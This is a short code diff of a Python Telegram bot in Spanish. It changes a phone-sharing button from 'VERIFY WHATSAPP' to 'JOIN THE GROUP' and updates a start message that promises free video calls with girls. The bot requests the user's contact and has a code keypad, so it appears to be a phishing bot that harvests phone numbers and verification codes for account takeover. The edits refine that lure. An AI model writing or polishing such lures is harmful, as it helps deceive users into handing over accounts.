@@ -20,7 +20,7 @@ UD_PHONE = "phone"
 UD_CODE  = "code"
 
 def share_phone_kb():
-    btn = KeyboardButton("📲 𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐑 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏", request_contact=True)
+    btn = KeyboardButton("👉🏻𝐔𝐍𝐈𝐑𝐌𝐄 𝐀𝐋 𝐆𝐑𝐔𝐏𝐎🇨🇺", request_contact=True)
     return ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)
 
 def build_keypad(code_str: str):
@@ -57,7 +57,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "𝐑𝐄𝐆𝐋𝐀 #𝟏: 𝐌𝐚𝐧𝐭𝐞𝐧𝐞𝐫 𝐬𝐢𝐞𝐦𝐩𝐫𝐞 𝐞𝐥 𝐫𝐞𝐬𝐩𝐞𝐭𝐨 𝐡𝐚𝐜𝐢𝐚 𝐥𝐚𝐬 𝐜𝐡𝐢𝐜𝐚𝐬 𝐞𝐧 𝐞𝐥 𝐠𝐫𝐮𝐩𝐨.\n\n"
         "𝐑𝐄𝐆𝐋𝐀 #𝟐: 𝐄𝐧 𝐥𝐚𝐬 𝐯𝐢𝐝𝐞𝐨𝐥𝐥𝐚𝐦𝐚𝐝𝐚𝐬 𝐠𝐫𝐚𝐭𝐢𝐬 𝐬𝐞𝐫 𝐫𝐞𝐬𝐩𝐞𝐭𝐮𝐨𝐬𝐨 𝐲 𝐧𝐨 𝐝𝐞𝐜𝐢𝐫 𝐠𝐫𝐨𝐬𝐞𝐫𝐢𝐚𝐬 𝐚 𝐥𝐚𝐬 𝐜𝐡𝐢𝐜𝐚𝐬.\n\n"
         "𝐏𝐚𝐫𝐚 𝐞𝐧𝐭𝐫𝐚𝐫 𝐚𝐥 𝐠𝐫𝐮𝐩𝐨, 𝐩𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭ó𝐧:\n"
-        "“𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐑 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏”"
+        "“𝐔𝐍𝐈𝐑𝐌𝐄 𝐀𝐋 𝐆𝐑𝐔𝐏𝐎”"
     )
 
     start_video = os.getenv("START_VIDEO", "").strip()
